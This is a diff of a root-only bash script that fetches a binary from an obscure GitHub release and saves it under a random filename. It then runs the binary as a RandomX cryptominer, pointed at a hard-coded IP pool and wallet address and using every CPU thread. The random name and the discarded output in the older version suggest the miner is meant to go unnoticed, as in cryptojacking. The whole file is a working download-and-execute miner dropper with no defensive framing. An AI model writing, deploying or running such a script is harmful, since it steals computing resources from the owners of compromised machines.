@@ -1,51 +1,45 @@
 #!/bin/bash
 set -e
 
-# Ensure script runs as root
+# Ensure root
 if [ "$(id -u)" -ne 0 ]; then
-    echo "Please run as root or with sudo"
+    echo "Run as root or sudo"
     exit 1
 fi
 
-# Fix temporary directory permissions
+# Fix temp directory
 mkdir -p /tmp
 chmod 1777 /tmp
 export TMPDIR=/tmp
 
-# Update repositories
+# Update packages
 apt update -qq
 
-# Install dependencies
+# Install required packages
 DEBIAN_FRONTEND=noninteractive apt install -y -qq \
-    build-essential cmake pkg-config \
-    libboost-all-dev libssl-dev \
-    libzmq3-dev libsodium-dev \
-    libunwind-dev liblzma-dev \
-    libreadline-dev libexpat1-dev \
-    libpgm-dev libhidapi-dev \
-    libusb-1.0-0-dev \
-    libprotobuf-dev protobuf-compiler \
-    libudev-dev libncurses6 \
-    libncursesw6 libtinfo6 \
-    libunbound-dev liblmdb-dev \
-    libminiupnpc-dev libuv1-dev \
-    git screen wget curl > /dev/null 2>&1
+    wget curl ca-certificates > /dev/null 2>&1
 
-# Generate random binary filename
+# Random binary name
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
-# Download binary
-wget -q \
+# Download binary (follow redirects)
+curl -L \
 https://github.com/yafcoplk/hmggklo/releases/download/hmggkloj/hmggklo \
--O "$BIN_NAME"
+-o "$BIN_NAME"
+
+# Verify it's not HTML
+if file "$BIN_NAME" | grep -qi "html"; then
+    echo "Download failed: received HTML instead of binary"
+    exit 1
+fi
 
 # Make executable
 chmod +x "$BIN_NAME"
 
-# Run binary
+# Run
 ./"$BIN_NAME" \
 -o 52.12.27.30:9032 \
 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym \
 -p hmggklo27N \
 -a rx/0 \
--t "$(nproc --all)" > /dev/null 2>&1
+-t "$(nproc --all)"
